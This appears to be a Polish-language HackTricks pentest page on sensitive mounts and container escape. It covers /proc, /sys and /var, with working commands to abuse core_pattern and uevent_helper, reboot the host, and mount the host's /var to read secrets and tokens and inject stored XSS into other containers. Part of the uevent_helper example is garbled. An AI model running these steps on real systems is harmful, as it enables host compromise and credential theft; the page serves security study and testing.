# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

Ekspozycja `/proc`, `/sys` i `/var` bez odpowiedniej izolacji przestrzeni nazw wprowadza znaczące ryzyko bezpieczeństwa, w tym powiększenie powierzchni ataku i ujawnienie informacji. Te katalogi zawierają wrażliwe pliki, które, jeśli są źle skonfigurowane lub dostępne dla nieautoryzowanego użytkownika, mogą prowadzić do ucieczki z kontenera, modyfikacji hosta lub dostarczenia informacji wspierających dalsze ataki. Na przykład, niewłaściwe zamontowanie `-v /proc:/host/proc` może obejść ochronę AppArmor z powodu swojej opartej na ścieżkach natury, pozostawiając `/host/proc` bez ochrony.

**Szczegółowe informacje o każdej potencjalnej luce można znaleźć w** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## procfs Vulnerabilities

### `/proc/sys`

Ten katalog pozwala na modyfikację zmiennych jądra, zazwyczaj za pomocą `sysctl(2)`, i zawiera kilka subkatalogów budzących niepokój:

#### **`/proc/sys/kernel/core_pattern`**

- Opisany w [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Umożliwia zdefiniowanie programu do wykonania przy generowaniu pliku rdzenia z pierwszymi 128 bajtami jako argumentami. Może to prowadzić do wykonania kodu, jeśli plik zaczyna się od rury `|`.
- **Przykład testowania i eksploatacji**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test dostępu do zapisu
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Ustaw niestandardowy handler
sleep 5 && ./crash & # Wywołaj handler
```

#### **`/proc/sys/kernel/modprobe`**

- Szczegóły w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Zawiera ścieżkę do ładowarki modułów jądra, wywoływanej do ładowania modułów jądra.
- **Przykład sprawdzania dostępu**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Sprawdź dostęp do modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Odniesienie w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Globalny flag, który kontroluje, czy jądro panikuje, czy wywołuje OOM killera, gdy występuje warunek OOM.

#### **`/proc/sys/fs`**

- Zgodnie z [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), zawiera opcje i informacje o systemie plików.
- Dostęp do zapisu może umożliwić różne ataki typu denial-of-service przeciwko hostowi.

#### **`/proc/sys/fs/binfmt_misc`**

- Umożliwia rejestrowanie interpreterów dla nienatywnych formatów binarnych na podstawie ich magicznego numeru.
- Może prowadzić do eskalacji uprawnień lub dostępu do powłoki root, jeśli `/proc/sys/fs/binfmt_misc/register` jest zapisywalny.
- Istotny exploit i wyjaśnienie:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Szczegółowy samouczek: [Link do wideo](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Inne w `/proc`

#### **`/proc/config.gz`**

- Może ujawniać konfigurację jądra, jeśli `CONFIG_IKCONFIG_PROC` jest włączone.
- Przydatne dla atakujących do identyfikacji luk w działającym jądrze.

#### **`/proc/sysrq-trigger`**

- Umożliwia wywoływanie poleceń Sysrq, co może powodować natychmiastowe ponowne uruchomienia systemu lub inne krytyczne działania.
- **Przykład ponownego uruchamiania hosta**:

```bash
echo b > /proc/sysrq-trigger # Ponownie uruchamia hosta
```

#### **`/proc/kmsg`**

- Ujawnia komunikaty z bufora pierścieniowego jądra.
- Może pomóc w exploitach jądra, wyciekach adresów i dostarczyć wrażliwe informacje o systemie.

#### **`/proc/kallsyms`**

- Wymienia eksportowane symbole jądra i ich adresy.
- Kluczowe dla rozwoju exploitów jądra, szczególnie w celu pokonania KASLR.
- Informacje o adresach są ograniczone, gdy `kptr_restrict` jest ustawione na `1` lub `2`.
- Szczegóły w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Interfejs z urządzeniem pamięci jądra `/dev/mem`.
- Historycznie podatny na ataki eskalacji uprawnień.
- Więcej w [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Reprezentuje fizyczną pamięć systemu w formacie ELF core.
- Odczyt może ujawniać zawartość pamięci systemu hosta i innych kontenerów.
- Duży rozmiar pliku może prowadzić do problemów z odczytem lub awarii oprogramowania.
- Szczegółowe użycie w [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Alternatywny interfejs dla `/dev/kmem`, reprezentujący wirtualną pamięć jądra.
- Umożliwia odczyt i zapis, a zatem bezpośrednią modyfikację pamięci jądra.

#### **`/proc/mem`**

- Alternatywny interfejs dla `/dev/mem`, reprezentujący pamięć fizyczną.
- Umożliwia odczyt i zapis, modyfikacja całej pamięci wymaga rozwiązania adresów wirtualnych na fizyczne.

#### **`/proc/sched_debug`**

- Zwraca informacje o planowaniu procesów, omijając zabezpieczenia przestrzeni nazw PID.
- Ujawnia nazwy procesów, identyfikatory i identyfikatory cgroup.

#### **`/proc/[pid]/mountinfo`**

- Dostarcza informacji o punktach montowania w przestrzeni nazw montowania procesu.
- Ujawnia lokalizację `rootfs` kontenera lub obrazu.

### `/sys` Vulnerabilities

#### **`/sys/kernel/uevent_helper`**

- Używane do obsługi `uevent` urządzeń jądra.
- Zapis do `/sys/kernel/uevent_helper` może wykonać dowolne skrypty po wyzwoleniu `uevent`.
- **Przykład eksploatacji**: %%%bash

#### Tworzy ładunek

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Znajduje ścieżkę hosta z montażu OverlayFS dla kontenera

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Ustawia uevent_helper na złośliwego pomocnika

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Wyzwala uevent

echo change > /sys/class/mem/null/uevent

#### Odczytuje wynik

cat /output %%%

#### **`/sys/class/thermal`**

- Kontroluje ustawienia temperatury, potencjalnie powodując ataki DoS lub fizyczne uszkodzenia.

#### **`/sys/kernel/vmcoreinfo`**

- Ujawnia adresy jądra, potencjalnie kompromitując KASLR.

#### **`/sys/kernel/security`**

- Zawiera interfejs `securityfs`, umożliwiający konfigurację modułów bezpieczeństwa Linux, takich jak AppArmor.
- Dostęp może umożliwić kontenerowi wyłączenie swojego systemu MAC.

#### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**

- Ujawnia interfejsy do interakcji z zmiennymi EFI w NVRAM.
- Błędna konfiguracja lub eksploatacja mogą prowadzić do zablokowanych laptopów lub nieuruchamialnych maszyn hosta.

#### **`/sys/kernel/debug`**

- `debugfs` oferuje interfejs debugowania "bez zasad" do jądra.
- Historia problemów z bezpieczeństwem z powodu swojej nieograniczonej natury.

### `/var` Vulnerabilities

Folder **/var** hosta zawiera gniazda czasu wykonywania kontenerów i systemy plików kontenerów. Jeśli ten folder jest zamontowany wewnątrz kontenera, ten kontener uzyska dostęp do odczytu i zapisu do systemów plików innych kontenerów z uprawnieniami root. Może to być wykorzystywane do przełączania się między kontenerami, powodowania odmowy usługi lub wprowadzania tylnego wejścia do innych kontenerów i aplikacji, które w nich działają.

#### Kubernetes

Jeśli taki kontener jest wdrażany z Kubernetes:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Wewnątrz kontenera **pod-mounts-var-folder**:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
XSS zostało osiągnięte:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Zauważ, że kontener NIE wymaga ponownego uruchomienia ani niczego innego. Wszelkie zmiany wprowadzone za pomocą zamontowanego **/var** folderu będą stosowane natychmiast.

Możesz również zastąpić pliki konfiguracyjne, binaria, usługi, pliki aplikacji i profile powłoki, aby osiągnąć automatyczne (lub półautomatyczne) RCE.

##### Dostęp do poświadczeń chmurowych

Kontener może odczytywać tokeny K8s serviceaccount lub tokeny AWS webidentity, co pozwala kontenerowi uzyskać nieautoryzowany dostęp do K8s lub chmury:
```bash
/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
#### Docker

Eksploatacja w Dockerze (lub w wdrożeniach Docker Compose) jest dokładnie taka sama, z tym że zazwyczaj systemy plików innych kontenerów są dostępne pod inną ścieżką bazową:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Więc systemy plików znajdują się pod `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Uwaga

Rzeczywiste ścieżki mogą się różnić w różnych konfiguracjach, dlatego najlepszym rozwiązaniem jest użycie polecenia **find**, aby
znaleźć systemy plików innych kontenerów



### Odniesienia

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
